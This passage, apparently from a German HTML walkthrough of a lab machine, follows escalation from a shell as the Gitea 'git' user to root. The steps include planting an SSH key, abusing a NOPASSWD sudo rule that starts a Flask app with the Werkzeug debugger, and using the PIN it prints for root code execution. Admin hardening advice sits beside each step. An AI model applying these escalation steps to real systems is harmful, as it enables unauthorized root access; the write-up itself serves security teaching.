Experten: Die Einrichtung und der Empfang einer Reverse Shell ist Standardpraxis für den Initial Access oder zur Etablierung einer stabileren Sitzung nach einer RCE. Das Landen im <code>git</code>-Home-Verzeichnis und einem spezifischen Gitea-Repository-Pfad bestätigt die Verbindung zum Benutzer, unter dem Gitea läuft, und liefert den genauen Startpunkt der Shell.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ich habe eine funktionierende, wenn auch keine voll-interaktive, Shell als Benutzer <code>git</code>. Dies ist der Benutzer, unter dem der Gitea-Dienst läuft, was für die weitere Privilegien-Eskalation relevant ist. Ich kann nun von dieser Shell aus Systembefehle ausführen und das System enumerieren.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Von dieser Shell aus werde ich das System weiter auf PE-Vektoren enumerieren, insbesondere auf SUID/SGID Binaries, Cronjobs, Dateiberechtigungen und <code>sudo</code>-Berechtigungen für den Benutzer <code>git</code>.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie ausgehende Netzwerkverbindungen von Systemen, insbesondere von Prozessen, die unter Low-Privilege-Benutzern laufen (wie hier Gitea/git), um Reverse Shells zu erkennen. Implementieren Sie Netzwerksegmentierung, um solche Verbindungen zu blockieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">git@logan2:~$</span> <span class="command">ls -la</span>
+<span class="command">total 20</span>
+<span class="command">drwxr-xr-x 4 git  git  4096 Jun 11 10:15 .</span>
+<span class="command">drwxr-xr-x 5 root root 4096 Sep 11  2023 ..</span>
+<span class="command">-rw-r--r-- 1 git  git   123 Jun 11 10:15 .gitconfig</span>
+<span class="command">drwxr-xr-x 3 git  git  4096 Sep 11  2023 gitea-repositories</span>
+<span class="command">drwx------ 2 git  git  4096 Aug 27  2023 .ssh</span>
+<span class="command">git@logan2:~$</span> <span class="command">echo 'ssh-ed25519 AAAAC3...jwy1T7 root@CCat' > authorized_keys</span>
+<span class="command">git@logan2:~$</span> <span class="command">ls</span>
+<span class="command">authorized_keys  gitea-repositories</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich bin nun im Home-Verzeichnis des Benutzers <code>git</code> (erkennbar am Prompt <code>git@logan2:~$</code> nach einem möglichen <code>cd ~</code>). Ich liste den Inhalt mit <code>ls -la</code> auf. Die Ausgabe zeigt die Standarddateien und -Verzeichnisse des Git-Benutzers, einschließlich <code>.gitconfig</code>, das Gitea-Repository-Verzeichnis <code>gitea-repositories</code> und das <code>.ssh</code>-Verzeichnis. Die Berechtigungen sind standardmäßig für den Eigentümer <code>git</code> gesetzt. Danach versuche ich, meinen öffentlichen SSH-Schlüssel (verkürzt dargestellt) in eine Datei namens <code>authorized_keys</code> *direkt in diesem Verzeichnis* (<code>/home/git/</code>) umzuleiten, mit dem Befehl <code>echo 'ssh-ed25519 AAAAC3...jwy1T7 root@CCat' > authorized_keys</code>. Ein anschließendes <code>ls</code> bestätigt, dass die Datei <code>authorized_keys</code> erfolgreich in <code>/home/git/</code> erstellt wurde. Für Laien: Im 'Zuhause' des Benutzers 'git' schaue ich mir an, was es dort gibt. Ich sehe einen Ordner namens <code>.ssh</code>, der oft für sichere Anmeldungen verwendet wird. Ich versuche dann, meine 'digitale Unterschrift' (öffentlichen SSH-Schlüssel) in eine Datei namens <code>authorized_keys</code> zu schreiben, aber nicht in den <code>.ssh</code>-Ordner, sondern direkt in 'git's Zuhause. Das hat funktioniert, die Datei ist jetzt da. Für Experten: Das Home-Verzeichnis des Benutzers <code>git</code> ist ein logischer Ort für die weitere Enumeration. Das <code>.ssh</code>-Verzeichnis ist besonders interessant für die SSH-basierte PE. Der Versuch, die <code>authorized_keys</code>-Datei direkt in <code>/home/git/</code> statt im Standardpfad <code>/home/git/.ssh/authorized_keys</code> zu erstellen, ist ungewöhnlich. Es ist unwahrscheinlich, dass der SSH-Daemon diese Datei an diesem Ort für die Authentifizierung berücksichtigt. Möglicherweise war dies ein Test der Schreibberechtigungen im Home-Verzeichnis oder ein Fehler in der Vorgehensweise, aber die Datei wurde erfolgreich geschrieben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ich habe die Struktur des Home-Verzeichnisses von Benutzer <code>git</code> enumeriert. Das <code>.ssh</code>-Verzeichnis ist vorhanden und könnte für eine PE relevant sein. Der Versuch, die <code>authorized_keys</code>-Datei direkt in <code>/home/git/</code> zu erstellen, ist zwar erfolgreich, aber funktionell wahrscheinlich irrelevant für die SSH-Authentifizierung. Dieser Schritt liefert noch keinen direkten PE-Vektor.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde die <code>authorized_keys</code>-Datei nun im korrekten <code>.ssh</code>-Verzeichnis platzieren. Dies erfordert möglicherweise andere Schreibrechte oder eine andere Methode als das einfache Umleiten mit <code>></code>, wenn das <code>.ssh</code>-Verzeichnis restriktivere Berechtigungen hat. Viel wichtiger ist jedoch die Suche nach SUID-Binaries oder <code>sudo</code>-Berechtigungen als nächster PE-Schritt von dieser Shell aus.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die Dateiberechtigungen in Benutzer-Home-Verzeichnissen, um sicherzustellen, dass normale Benutzer keine kritischen Dateien (wie SSH <code>authorized_keys</code>, auch wenn am falschen Ort) manipulieren können. Das <code>.ssh</code>-Verzeichnis und seine Inhalte sollten nur für den Eigentümer lesbar/schreibbar sein (Berechtigungen 700 bzw. 600).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">git@logan2:~$</span> <span class="command">sudo -l</span>
+<span class="command">Matching Defaults entries for git on logan2:</span>
+    <span class="command">env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty</span>
+
+<span class="command">User git may run the following commands on logan2:</span>
+    <span class="password">(ALL) NOPASSWD: /usr/bin/python3 /opt/app.py</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer <code>git</code> prüfe ich nun meine <code>sudo</code>-Berechtigungen mit dem Befehl <code>sudo -l</code>. Dieser Befehl listet auf, welche Befehle der aktuelle Benutzer (<code>git</code>) als ein anderer Benutzer oder Root ausführen darf, und ob dafür ein Passwort benötigt wird. Die Ausgabe zeigt einen sehr interessanten Eintrag: <code>(ALL) NOPASSWD: /usr/bin/python3 /opt/app.py</code>. Dies bedeutet, dass der Benutzer <code>git</code> den Befehl <code>/usr/bin/python3 /opt/app.py</code> als *jeden* Benutzer (angegeben durch <code>ALL</code>, einschließlich root) ausführen darf, **ohne dass eine Passworteingabe erforderlich ist** (angegeben durch <code>NOPASSWD</code>). Für Laien: Ich habe nachgeschaut, ob 'git' spezielle 'Admin-Befehle' ausführen darf, ohne sein Passwort zu kennen. Und ja, 'git' darf ein bestimmtes Python-Programm (<code>/opt/app.py</code>) mit den Rechten jedes anderen Benutzers – inklusive des Super-Administrators (root) – starten, einfach so, ohne nach einem Passwort gefragt zu werden! Für Experten: Das ist eine klassische und kritische <code>sudo</code>-Fehlkonfiguration. Die Möglichkeit, ein Python-Skript (<code>/opt/app.py</code>) mit Root-Rechten über <code>sudo /usr/bin/python3 /opt/app.py</code> NOPASSWD auszuführen, ist ein direkter Privilegien-Eskalationsvektor. Die Frage ist nun, was das Skript <code>/opt/app.py</code> tut und ob es zur Erlangung einer Root-Shell missbraucht werden kann.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Fund der <code>sudo</code>-Berechtigung <code>(ALL) NOPASSWD: /usr/bin/python3 /opt/app.py</code> ist ein entscheidender Durchbruch für die Privilegien-Eskalation. Dies ist unser primärer PE-Vektor. Die Möglichkeit, ein Skript mit Root-Rechten auszuführen, ist fast gleichbedeutend mit Root-Zugriff, wenn das Skript manipuliert werden kann oder selbst unsicher ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mein nächster Schritt ist die Untersuchung des Skripts <code>/opt/app.py</code>. Obwohl ich als Benutzer <code>git</code> möglicherweise keine Leserechte für die Datei habe (siehe nächste Schritte), kann ich es über <code>sudo</code> ausführen. Ich muss verstehen, was das Skript tut und ob ich seine Ausführung als Root ausnutzen kann. Dies könnte durch die Übergabe bösartiger Argumente, die Manipulation von Umgebungsvariablen oder das Ausnutzen von Schwachstellen im Skript selbst geschehen.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie alle <code>sudo</code>-Regeln sorgfältig. <code>NOPASSWD</code> sollte nur für absolut notwendige, genau definierte Befehle mit minimalen Rechten verwendet werden. Erlauben Sie niemals die Ausführung eines Skript-Interpreters (wie python3, bash, perl) mit <code>NOPASSWD ALL</code> oder ähnlichen breiten Berechtigungen, insbesondere nicht für Skripte, die von Benutzern manipuliert werden könnten oder deren Inhalt unbekannt ist.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">git@logan2:~$</span> <span class="command">cat /opt/app.py</span>
+<span class="command">cat: /opt/app.py: Permission denied</span>
+<span class="command">git@logan2:~$</span> <span class="command">ls -la /opt/app.py</span>
+<span class="command">ls: cannot access '/opt/app.py': Permission denied</span></pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich versuche, den Inhalt des Skripts <code>/opt/app.py</code> mit <code>cat /opt/app.py</code> auszulesen und die Dateiberechtigungen mit <code>ls -la /opt/app.py</code> zu prüfen. Beide Befehle geben die Fehlermeldung <code>Permission denied</code> zurück. Für Laien: Ich habe versucht, das Python-Programm, das 'git' als 'root' starten darf, anzuschauen und zu sehen, wer es lesen darf. Aber mir wurde der Zugriff verweigert, ich darf die Datei nicht sehen oder lesen. Für Experten: Die Fehlermeldung <code>Permission denied</code> bei Lese- und Zugriffsversuchen bestätigt, dass der Benutzer <code>git</code> keine Dateisystemberechtigungen hat, um <code>/opt/app.py</code> direkt zu lesen oder dessen Attribute (wie Berechtigungen) zu sehen. Dies ist eine effektive Maßnahme, die verhindert, dass ein Angreifer den Quellcode des Skripts analysiert, bevor er es ausführt. Es ändert jedoch nichts an der Tatsache, dass das Skript über <code>sudo</code> mit Root-Rechten ausgeführt werden kann, selbst wenn sein genauer Inhalt unbekannt ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ich kann den Quellcode von <code>/opt/app.py</code> als Benutzer <code>git</code> nicht einsehen. Dies erschwert die Analyse, aber die <code>sudo</code>-Berechtigung ermöglicht weiterhin die Ausführung als Root. Ich muss das Skript 'blind' ausführen oder versuchen, sein Verhalten durch die Ausführung als Root zu ergründen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl ich den Quellcode nicht lesen kann, werde ich das Skript nun über die <code>sudo</code>-Berechtigung als Root ausführen: <code>sudo /usr/bin/python3 /opt/app.py</code>. Ich werde die Ausgabe genau beobachten, um zu verstehen, was das Skript tut und ob es interaktive Eingaben erfordert oder Debug-Informationen preisgibt.<br><strong>Empfehlung (Admin):</strong> Wenn ein Skript mit erhöhten Rechten über <code>sudo</code> ausgeführt werden darf, stellen Sie sicher, dass es für den ausführenden Benutzer zumindest lesbar ist, damit der Benutzer (oder ein Administrator bei der Sicherheitsüberprüfung) dessen Inhalt verstehen kann. Idealerweise sollte das Skript nur von Root lesbar und ausführbar sein und nicht über <code>sudo</code> von anderen Benutzern gestartet werden können. Überprüfen Sie Dateisystemberechtigungen sorgfältig.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <pre><span class="command">git@logan2:~$</span> <span class="command">sudo /usr/bin/python3 /opt/app.py</span>
+<span class="password"> * Serving Flask app 'app'</span>
+<span class="password"> * Debug mode: on</span>
+<span class="password">WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.</span>
+<span class="password"> * Running on all addresses (0.0.0.0)</span>
+<span class="password"> * Running on http://127.0.0.1:8000</span>
+<span class="password"> * Running on http://192.168.2.35:8000</span>
+<span class="password">Press CTRL+C to quit</span>
+<span class="password"> * Restarting with stat</span>
+<span class="password"> * Debugger is active!</span>
+<span class="password"> * Debugger PIN: 428-583-209</span></pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich führe das Python-Skript <code>/opt/app.py</code> nun wie geplant über die <code>sudo</code>-Berechtigung als Root aus: <code>sudo /usr/bin/python3 /opt/app.py</code>. Da die <code>sudo</code>-Regel <code>NOPASSWD</code> enthält, werde ich nicht nach einem Passwort gefragt. Die Ausgabe des Skripts zeigt, dass es sich um eine Flask-Webanwendung handelt, die gestartet wird. Die Ausgabe ist extrem aufschlussreich: Sie gibt an, dass der 'Debug mode' aktiviert ist (<code>* Debug mode: on</code>), dass ein Entwicklungsserver gestartet wird (<code>* Serving Flask app 'app'</code>), der auf allen Adressen (<code>0.0.0.0</code>) auf Port 8000 lauscht, und am wichtigsten: 'Debugger is active! Debugger PIN: 428-583-209'. Für Laien: Ich habe das Python-Programm mit Administratorrechten gestartet. Es hat mir gesagt, dass es jetzt eine Webseite auf einer neuen 'Adresse' (Port 8000) geöffnet hat und – fantastisch – dass es einen 'Geheimzugang' (Debugger) gibt, der aktiv ist, und mir sogar die geheime Nummer (PIN: 428-583-209) dafür gegeben hat! Für Experten: Die Ausführung von <code>/opt/app.py</code> als Root startet eine Flask-Webanwendung mit aktivem Debug-Modus und dem Werkzeug Debugger auf Port 8000, erreichbar auf allen Interfaces (0.0.0.0). Die automatische Ausgabe des Debugger-PINs (<code>428-583-209</code>) im Standard-Output des Prozesses (hier meiner Shell) ist eine schwerwiegende Fehlkonfiguration und eine direkte Einladung zur Kompromittierung des Debuggers. Das Starten der Anwendung mit Root-Rechten bedeutet, dass der Debugger selbst mit Root-Berechtigungen läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausführung von <code>/opt/app.py</code> als Root hat eine kritische Schwachstelle offengelegt und direkt den Debugger-PIN (<code>428-583-209</code>) geliefert. Da der Debugger mit Root-Rechten läuft, bedeutet die Kompromittierung des Debuggers Root Code Execution. Dies ist der entscheidende Privilegien-Eskalationsvektor.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun auf den neu geöffneten Port 8000 zugreifen, die Werkzeug Debugger Konsole aufsuchen und den erhaltenen PIN eingeben, um sie freizuschalten. Sobald die Konsole entsperrt ist, kann ich Python-Code mit Root-Berechtigungen ausführen und eine Root-Shell etablieren. Ich muss die Flask-Anwendung (<code>/opt/app.py</code>) im Hintergrund laufen lassen, da sie den Debugger hostet.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie den Debug-Modus und den Werkzeug Debugger in Produktionsumgebungen vollständig. Starten Sie Webanwendungen niemals mit Root-Rechten. Überprüfen Sie <code>sudo</code>-Regeln, die die Ausführung von Programmen ermöglichen, die potenziell Debug-Modi aktivieren oder sensible Informationen (wie PINs) ausgeben könnten. Überwachen Sie neu gestartete Dienste auf unerwarteten Ports, insbesondere solche mit erhöhten Rechten.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="command">git@logan2:~/.ssh$</span> <span class="command">ss -altpn</span>
+<span class="command">State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess</span>
+<span class="password">LISTEN 0      128          0.0.0.0:8000      0.0.0.0:*</span>
+<span class="command">LISTEN 0      80         127.0.0.1:3306      0.0.0.0:*</span>
+<span class="command">LISTEN 0      128          0.0.0.0:22        0.0.0.0:*</span>
+<span class="command">LISTEN 0      4096               *:3000            *:*    users:(("gitea",pid=526,fd=36))</span>
+<span class="command">LISTEN 0      511                *:80              *:*</span>
+<span class="command">LISTEN 0      128             [::]:22           [::]:*</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich überprüfe die offenen Ports auf dem Zielsystem erneut, diesmal aus der Shell des Benutzers <code>git</code> (obwohl der Prompt <code>git@logan2:~/.ssh$</code> anzeigt, dass ich mich gerade im <code>.ssh</code>-Verzeichnis befand). Ich verwende <code>ss -altpn</code>, um alle lauschenden TCP-Sockets mit Prozessinformationen anzuzeigen. Die Ausgabe bestätigt die Ports 22, 80 und 3000 (Gitea). Entscheidend ist der neue Eintrag <code>LISTEN 0 128 0.0.0.0:8000 0.0.0.0:*</code>. Dies zeigt, dass ein Prozess auf Port 8000 auf allen Interfaces (<code>0.0.0.0</code>) lauscht, genau wie es die Ausgabe beim Starten von <code>/opt/app.py</code> angekündigt hat. Leider zeigt <code>ss -p</code> hier nicht direkt den Prozessnamen oder Benutzer an, der Port 8000 geöffnet hat (wie es bei Gitea auf 3000 der Fall ist), aber basierend auf der vorherigen Ausführung von <code>sudo /usr/bin/python3 /opt/app.py</code> weiß ich, dass dies die von mir gestartete Flask-Anwendung ist, die mit Root-Rechten läuft. Für Laien: Ich habe wieder geschaut, welche 'Telefonleitungen' (Ports) auf dem Computer 'besetzt' sind. Und ich sehe, dass die neue 'Leitung' (Port 8000), die das Python-Programm (das ich als 'root' gestartet habe) geöffnet hat, jetzt aktiv ist. Für Experten: Die <code>ss</code>-Ausgabe bestätigt die erfolgreiche Bindung des Flask-Servers an Port 8000 auf allen Interfaces. Dies ist der Endpunkt, über den ich nun auf den mit Root-Rechten laufenden Debugger zugreifen kann. Die Fähigkeit, neue Ports zu öffnen, ist oft ein Nebeneffekt von RCE oder PE und ein wichtiger Indikator für die Systemkompromittierung.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Port 8000 ist offen und lauscht, gehostet von der Flask-Anwendung, die ich als Root gestartet habe. Dies ist der Zugangspunkt zum Root-Debugger.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde nun meinen Browser oder <code>curl</code> verwenden, um auf <code>http://192.168.2.35:8000</code> zuzugreifen und die Debugger-Konsole zu finden. Mit dem bereits erhaltenen PIN <code>428-583-209</code> kann ich die Konsole entsperren und Befehle als Root ausführen.<br><strong>Empfehlung (Admin):</strong> Überwachen Sie aktiv alle lauschenden Ports auf Ihren Servern und stellen Sie sicher, dass jeder offene Port einem bekannten, autorisierten Dienst zugeordnet ist. Unerwartete offene Ports, insbesondere solche auf hohen Ports oder die von ungewöhnlichen Prozessen oder Benutzern geöffnet wurden, sind ein starkes Indiz für eine Kompromittierung.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">curl http://192.168.2.35:8000/ -Iv</span></div>
+                </div>
+                <div class="terminal">
+                    <pre>
+<span class="password">*   Trying 192.168.2.35:8000...</span>
+<span class="password">* Connected to 192.168.2.35 (192.168.2.35) port 8000</span>
+<span class="password">* using HTTP/1.x</span>
+<span class="command">> HEAD / HTTP/1.1</span>
+<span class="command">> Host: 192.168.2.35:8000</span>
+<span class="command">> User-Agent: curl/8.13.0</span>
+<span class="command">> Accept: */*</span>
+<span class="command">></span>
+<span class="password">* Request completely sent off</span>
+<span class="command">< HTTP/1.1 200 OK</span>
+<span class="command">HTTP/1.1 200 OK</span>
+<span class="command">< Server: Werkzeug/2.3.7 Python/3.11.2</span>
+<span class="command">Server: Werkzeug/2.3.7 Python/3.11.2</span>
+<span class="command">< Date: Wed, 11 Jun 2025 20:05:50 GMT</span>
+<span class="command">Date: Wed, 11 Jun 2025 20:05:50 GMT</span>
+<span class="command">< Content-Type: text/html; charset=utf-8</span>
+<span class="command">Content-Type: text/html; charset=utf-8</span>
+<span class="command">< Content-Length: 7226</span>
+<span class="command">Content-Length: 7226</span>
+<span class="command">< Connection: close</span>
+<span class="command">Connection: close</span>
+<span class="command"><</span>
+
+<span class="password">* shutting down connection #0</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ich verwende <code>curl</code> mit den Flags <code>-I</code> (nur Header) und <code>-v</code> (verbose) gegen die URL <code>http://192.168.2.35:8000/</code>, um zu überprüfen, ob der Dienst auf Port 8000 wie erwartet antwortet und welche Technologie dahintersteckt. Für Laien: Ich klopfe an die neue 'Tür' (Port 8000) des Zielcomputers und frage, wer da ist, ohne hineinzugehen. Für Experten: Die <code>curl -Iv</code> Anfrage sendet eine HEAD-Anfrage und zeigt die Antwort-Header. Die Ausgabe bestätigt einen <code>HTTP/1.1 200 OK</code> Status, was bedeutet, dass der Dienst erreichbar ist. Die Server-Header (<code>Server: Werkzeug/2.3.7 Python/3.11.2</code>) bestätigen eindeutig, dass hier eine Flask-Anwendung mit Werkzeug als Webserver läuft, genau wie die Ausgabe beim Starten von <code>/opt/app.py</code> angedeutet hat.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Technologie und Erreichbarkeit des Dienstes auf Port 8000 sind bestätigt. Dies ist die erwartete Flask/Werkzeug-Anwendung, die den Root-Debugger beherbergt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich bin bereit, auf die Debugger-Konsole zuzugreifen und den erhaltenen PIN zu verwenden, um Root Code Execution zu erlangen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass unnötige Dienste, insbesondere Entwicklungsserver oder Debugger, nicht auf öffentlich zugänglichen Ports lauschen. Überwachen Sie die Server-Header Ihrer Webanwendungen auf ungewollte Technologie-Offenlegung (z.B. Werkzeug, spezifische Versionen), es sei denn, dies ist für den Betrieb notwendig.</p>
+
+             <p class="analysis"><strong>Analyse:</strong> Nachdem ich den Debugger-PIN erhalten und den Dienst auf Port 8000 als Flask/Werkzeug identifiziert habe, ist der nächste logische Schritt, auf die Debugger-Konsole zuzugreifen. Typischerweise ist die Werkzeug Debugger Konsole unter dem Pfad <code>/console</code> verfügbar, wenn der Debug-Modus aktiviert ist. Ich navigiere zu <code>http://192.168.2.35:8000/console</code> im Browser oder verwende ein Tool, das die Interaktion ermöglicht. Die erwartete Seite sollte die Debugger-Oberfläche anzeigen, die zur Eingabe des PINs auffordert, um die Code-Ausführungsfunktion zu entsperren. Für Laien: Ich gehe jetzt auf die spezielle 'Webseite' (Adresse mit Port 8000 und Pfad /console), die das 'Geheimzugangsprogramm' (Debugger) anzeigt. Dort sollte ich ein Feld sehen, in das ich die geheime Nummer (PIN) eingeben kann, die ich zuvor bekommen habe. Für Experten: Der Zugriff auf <code>/console</code> ist der Standardweg, um mit dem Werkzeug Debugger zu interagieren. Da der Debugger mit Root-Rechten läuft (weil das Skript <code>/opt/app.py</code> mit <code>sudo /usr/bin/python3</code> als Root gestartet wurde), wird die Entsperrung der Konsole RCE mit Root-Berechtigungen ermöglichen. Die Benutzeroberfläche im Browser fordert zur Eingabe des PINs auf.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Zugangspunkt zur Root-Debugger-Konsole ist identifiziert und erreichbar. Ich besitze den PIN und bin bereit, die Konsole zu entsperren und Root-Rechte zu erlangen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ich werde den erhaltenen PIN <code>428-583-209</code> in das PIN-Feld der Debugger-Konsole eingeben. Nach erfolgreicher Authentifizierung werde ich die interaktive Konsole nutzen, um eine Root-Shell zu etablieren.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Werkzeug Debugger Konsole (und ähnliche Debug-Tools) niemals in Produktionsumgebungen aktiviert oder öffentlich zugänglich ist. Wenn sie unbedingt benötigt wird, beschränken Sie den Zugriff streng nach IP-Adresse oder Netzwerksegment.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <pre><span class="password">* Debugger pin code: 428-583-209</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese Zeile wiederholt explizit den im Standard-Output der <code>sudo /usr/bin/python3 /opt/app.py</code> Ausführung gefundenen Debugger-PIN: <code>428-583-209</code>. Sie dient als klare Zusammenfassung und Hervorhebung des kritischsten Fundes für die Privilegien-Eskalation. Für Laien: Hier ist nochmal die super-geheime Nummer (der PIN), die ich brauche, um den speziellen 'Geheimzugang' zu öffnen. Für Experten: Die Wiederholung des PINs unterstreicht seine Bedeutung als primären Schlüssel zur Erlangung von Root Code Execution über den Werkzeug Debugger. Es ist eine Bestätigung, dass dieser spezifische Wert verwendet werden muss, um die Authentifizierungshürde des Debuggers zu überwinden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der PIN <code>428-583-209</code> ist verifiziert und einsatzbereit. Alle Voraussetzungen für die Ausnutzung des Root-Debuggers sind erfüllt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der nächste Schritt ist die direkte Anwendung dieses PINs in der Werkzeug Debugger Konsole auf Port 8000.<br><strong>Empfehlung (Admin):</strong> Die automatische Ausgabe des Debugger-PINs im Standard-Output des Prozesses ist eine extrem unsichere Standardkonfiguration, die umgehend geändert werden muss. Debugger-PINs sollten niemals auf diese Weise offengelegt werden.</p>
+
+            <section id="proof-of-concept">
+                 <h2>Proof of Concept: Root Code Execution über Werkzeug Debugger</h2>
+                 <p><strong>Kurzbeschreibung:</strong> Dieser Proof of Concept demonstriert die Erlangung von Root-Berechtigungen durch die Ausnutzung des Werkzeug Debuggers, der von einem Python-Skript (<code>/opt/app.py</code>) mit Root-Rechten gestartet wurde. Durch die einfache Ausführung des Skripts via einer NOPASSWD-Sudo-Regel wurde der Debugger aktiviert und dessen PIN direkt im Standard-Output ausgegeben. Mit diesem PIN konnte die interaktive Python-Konsole des Debuggers freigeschaltet und beliebiger Code mit Root-Berechtigungen ausgeführt werden.</p>
+                 <p><strong>Voraussetzungen:</strong></p>
+                 <ul>
+                     <li>Initialer Zugriff als Benutzer <code>git</code> (erlangt über Gitea RCE).</li>
+                     <li>Existenz einer <code>sudo</code>-Regel, die Benutzer <code>git</code> erlaubt, <code>/usr/bin/python3 /opt/app.py</code> als Root ohne Passwort auszuführen: <code>(ALL) NOPASSWD: /usr/bin/python3 /opt/app.py</code>.</li>
+                     <li>Das Skript <code>/opt/app.py</code> muss so konfiguriert sein, dass es den Werkzeug Debugger aktiviert und dessen PIN im Standard-Output ausgibt.</li>
+                     <li>Netzwerkzugriff auf den neu gestarteten Dienst auf Port 8000.</li>
+                 </ul>
+                 <p><strong>Schritt-für-Schritt-Anleitung:</strong></p>
+                 <ol>
+                     <li>Erlange eine Shell als Benutzer <code>git</code>.</li>
+                     <li>Prüfe die <code>sudo</code>-Berechtigungen des Benutzers <code>git</code> mit <code>sudo -l</code>.</li>
+                     <li>Identifiziere die Regel <code>(ALL) NOPASSWD: /usr/bin/python3 /opt/app.py</code>.</li>
+                     <li>Führe den erlaubten Befehl als Root aus: <code>sudo /usr/bin/python3 /opt/app.py</code>.</li>
+                     <li>Beobachte den Standard-Output der Ausführung, um den Werkzeug Debugger PIN zu erhalten (<code>428-583-209</code>).</li>
+                     <li>Greife im Browser oder mit einem geeigneten Tool auf die Werkzeug Debugger Konsole unter <code>http://[Ziel-IP]:8000/console</code> zu.</li>
+                     <li>Gib den erhaltenen PIN (<code>428-583-209</code>) in das PIN-Feld ein und bestätige, um die Konsole zu entsperren.</li>
+                     <li>Nutze die freigeschaltete Konsole, um Python-Code mit Root-Berechtigungen auszuführen (z.B. Befehle über <code>os.system()</code> oder <code>subprocess.call()</code>) und eine Root-Shell zu etablieren.</li>
+                 </ol>
+
+                <div class="code-block">
+                     <div class="terminal">
+                          <pre><span class="command">git@logan2:~$</span> <span class="command">sudo /usr/bin/python3 /opt/app.py</span>
+<span class="password"> * Serving Flask app 'app'</span>
+<span class="password"> * Debug mode: on</span>
+<span class="password">WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.</span>
+<span class="password"> * Running on all addresses (0.0.0.0)</span>
+<span class="password"> * Running on http://127.0.0.1:8000</span>
+<span class="password"> * Running on http://192.168.2.35:8000</span>
+<span class="password">Press CTRL+C to quit</span>
+<span class="password"> * Restarting with stat</span>
+<span class="password"> * Debugger is active!</span>
+<span class="password"> * Debugger PIN: 428-583-209</span></pre>
+                     </div>
+                </div>
+                <p class="analysis"><strong>Analyse:</strong> Dieser Code-Block ist der Beweis für die Ausführung des Skripts als Root und die Offenlegung des Debugger-PINs. Die Ausgabe zeigt klar, dass der Debugger aktiv ist und liefert den PIN. Dies ist der zentrale Schritt, der Root-Zugriff ermöglichte.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Die erfolgreiche Ausführung und die Ausgabe des PINs sind der direkte Beweis für die Ausnutzbarkeit der kombinierten Sudo- und Debugger-Schwachstelle.</p>
+                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der PIN ist bekannt und die Konsole ist erreichbar. Direkter Zugriff auf Root-Shell.<br><strong>Empfehlung (Admin):</strong> Dies ist die Root Cause der Kompromittierung. Beheben Sie die Sudo-Regel und deaktivieren Sie den Debugger.</p>
+
+
+                <div class="code-block">
+                     <div class="terminal">
+                          <pre><span class="password">* Debugger pin code: 428-583-209</span></pre>
+                     </div>
+                 </div>
+                <p class="analysis"><strong>Analyse:</strong> Wiederholung des PINs zur Hervorhebung.</p>
+                <p class="evaluation"><strong>Bewertung:</strong> Bestätigung des kritischen PINs.</p>
+                <p class="recommendation"><strong>Empfehlung (Pentester):</strong> PIN verwenden.<br><strong>Empfehlung (Admin):</strong> PIN-Ausgabe verhindern.</p>
+
+                <img src="console_locked.jpg" alt="Screenshot der Werkzeug Debugger Konsole, die zur Eingabe des PINs auffordert.">
